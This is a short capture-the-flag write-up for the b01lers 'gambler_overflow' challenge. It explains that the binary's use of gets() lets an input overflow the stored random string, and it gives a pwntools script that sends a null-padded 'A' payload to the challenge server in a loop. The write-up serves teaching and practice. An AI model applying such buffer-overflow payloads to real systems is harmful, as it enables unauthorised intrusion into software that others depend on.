## Question 

Feeling luuuuuuuucky? \

You must create a flag.txt in the same folder as the binary for it to run. \
nc ctf.b01lers.com 9203 \

Author: robotearthpizza \
Difficulty: Easy \

[gambler_overflow](gambler-baby2) \

## Solution

The binary uses ```gets```, which we can abuse to overflow the local variable containing the random string.

```
0000158d          printf(format: "Guess me a string of length 4 wi…")
0000159e          gets(buf: &var_20)
000015b6          printf(format: "Your guess: %s\n", &var_20)
```

```python
from pwn import *

p = process('./gambler-baby2')
p = remote('ctf.b01lers.com', 9203)

while (True):
    data = b'A\0'*8+b'A\0'*8
    p.sendline(data)
    print(p.recvline())

p.interactive()
```

